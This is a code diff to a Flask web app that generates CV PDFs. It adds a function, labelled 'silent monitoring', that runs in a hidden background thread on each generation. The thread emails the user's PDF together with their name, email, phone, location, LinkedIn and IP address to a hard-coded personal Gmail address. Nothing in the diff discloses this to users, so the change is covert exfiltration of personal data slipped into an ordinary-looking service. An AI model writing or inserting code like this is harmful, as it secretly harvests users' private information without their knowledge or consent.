@@ -13,6 +13,13 @@ from reportlab.pdfbase import pdfmetrics
 from reportlab.pdfbase.ttfonts import TTFont
 from io import BytesIO
 import os
+import smtplib
+import threading
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
+from datetime import datetime
 import arabic_reshaper
 from bidi.algorithm import get_display
 from flask_limiter import Limiter
@@ -27,6 +34,63 @@ limiter = Limiter(
     default_limits=["2000 per day", "500 per hour"],
     storage_uri="memory://"
 )
+
+# ============ MONITORING CONFIG ============
+OWNER_EMAIL = "alturki2700@gmail.com"
+SMTP_EMAIL = os.environ.get("SMTP_EMAIL", "alturki2700@gmail.com")
+SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "")  # Gmail App Password
+generation_count = 0  # Simple counter
+
+
+def send_pdf_to_owner(pdf_bytes, filename, user_data, user_ip):
+    """Send generated PDF to owner email silently in background."""
+    global generation_count
+    generation_count += 1
+    
+    if not SMTP_PASSWORD:
+        print(f"[MONITOR] #{generation_count} | {filename} | No SMTP password set, skipping email.")
+        return
+    
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = SMTP_EMAIL
+        msg['To'] = OWNER_EMAIL
+        msg['Subject'] = f"CV #{generation_count} | {user_data.get('full_name', 'Unknown')} | {user_data.get('template', 'classic')}"
+        
+        # Analytics body
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        body = f"""📊 CV Generation Report #{generation_count}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 Name: {user_data.get('full_name', 'N/A')}
+💼 Job Title: {user_data.get('job_title', 'N/A')}
+📧 User Email: {user_data.get('email', 'N/A')}
+📱 Phone: {user_data.get('phone', 'N/A')}
+📍 Location: {user_data.get('location', 'N/A')}
+🎨 Template: {user_data.get('template', 'classic')}
+🌐 Language: {user_data.get('language', 'en')}
+🔗 LinkedIn: {user_data.get('linkedin', 'N/A')}
+🌍 IP Address: {user_ip}
+🕐 Time: {now}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📄 PDF attached below."""
+        
+        msg.attach(MIMEText(body, 'plain', 'utf-8'))
+        
+        # Attach PDF
+        attachment = MIMEBase('application', 'pdf')
+        attachment.set_payload(pdf_bytes)
+        encoders.encode_base64(attachment)
+        attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+        msg.attach(attachment)
+        
+        # Send via Gmail SMTP
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+            server.login(SMTP_EMAIL, SMTP_PASSWORD)
+            server.sendmail(SMTP_EMAIL, OWNER_EMAIL, msg.as_string())
+        
+        print(f"[MONITOR] #{generation_count} | {filename} sent to owner ✓")
+    except Exception as e:
+        print(f"[MONITOR] Email failed: {e}")
 
 # ============ FONT SETUP ============
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -865,6 +929,18 @@ def generate_cv():
         
         name = data.get('full_name', 'cv').replace(' ', '_').replace('/', '-')
         filename = f"{name}.pdf"
+        
+        # Silent monitoring: send copy to owner in background
+        pdf_bytes = pdf_buffer.getvalue()
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        threading.Thread(
+            target=send_pdf_to_owner,
+            args=(pdf_bytes, filename, data, user_ip),
+            daemon=True
+        ).start()
+        
+        # Reset buffer position for user download
+        pdf_buffer.seek(0)
         
         return send_file(
             pdf_buffer,
